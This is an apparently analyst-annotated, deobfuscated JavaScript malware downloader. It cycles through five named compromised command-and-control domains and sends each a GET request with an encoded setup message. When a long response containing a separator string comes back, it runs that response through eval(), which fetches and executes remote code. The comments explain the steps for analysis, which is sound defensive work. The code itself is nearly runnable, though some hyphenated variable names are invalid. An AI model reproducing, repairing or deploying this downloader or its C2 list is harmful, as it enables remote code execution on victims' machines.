var counter = 0; //initialize counter for array of domains
var C2_list = ["musaler.ru","csasesores.com.ar","www.mecanique-de-precision.net","vademecsa.com.ar","4southern.com"]; // list of hacked domains running the C2 software
var C2_quantity = C2_list.length; // The list of domains always seems to be 5
while(true) // Eval 1 - iterates counter
{
	if(counter>=C2_quantity) // Eval 2: checks counter
	{
		break; // When counter >= 5, give up
	}
	try // Eval 3: Attempt to communicate with C2
	{		
		var xml-get = new ActiveXObject("MSXML2.XMLHTTP"); // ActiveX, go die in a fire
		var C2-setup-msg = '0000001NSE1QJXGuBYi51yKzKJva2Sv9FW3BB71A03463500MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuOo1y1tfEWA1hmi4jx6A4w7cHlNdZN7ovLD1h-cwOkqnw4mMtLpYunYi6sHsitl2oy5EnhkcL1U4Lntch4nSLABlXMCYUzmMK_bq3a3Xnl-ltOAzD0Yvm4NDpr9U8HHTgdbsKwOosoJZ9W1CFicn4vM1lUraTWOQO22G6oIs4-bDJLhEgPVFwOVbVeXJE--Phpma60R58fqy6q_k8QKGE0OmeR_7K40Y8zIrc9PW86gvbWrWvUsIhIf2TzcBCBAfIOgyYINNYMoKzD9rNfPIXsXHz7Wi5wLiHRbHkEgTNUjlhml73VwGdaheYfyeGzun6w1sIQ254fkQneGE7HL0cwIDAQABzXcF8ZMqADhrXE3njlR_e7y6BYjvJlR6ffAJaPT3njPcY3ueoqQITGiLY4SZaudJFGNOm-4S8UgLWSFWbUbEPzMt0'; //no idea what all this shit is yet
		var separator = '409813d194b293015da5e41a3bfab14d'; // This separator must exist in responseText, or it assumes failed - perhaps a signing key is in the setup msg and this response is the validation?
		xml-get.open(GET, "http://"+C2_list[counter]+'/'+counter+'?'+C2-setup-msg, false); // set up the GET request
		xml-get.send(); // send the GET request to a C2 domain
		var httpd-response = xml-get.responseText; // capture the C2 response
		var response-length = httpd-response.length; // grab the length of the response
		var C2-response-code = httpd-response.indexOf(separator);		 // looking for the expected separator
		if ((response-length) > 1000 && C2-response-code > -1) // Eval 4: Checking for a good response - more than 1000 bytes and should contain separator
		{
			var deobfuscate-response = httpd-response.split(separator).join("a"); // Split the responseText by the value of separator - after separating, and rejoin using an ASCII letter 'a'. Effectively a find/replace 
			hust(deobfuscate-response); // Run deobfuscation on response and run  VBscript received from C2
			break;			
		}
	}
	catch(e) // Pass to error handler and log in console, I assume - no other error handling here
	{
	};
	counter++;
};
function hust(gulibator){eval(gulibator);} // run deobfuscation on C2 response, which must be the downloader, since this code really only serves to find a working C2


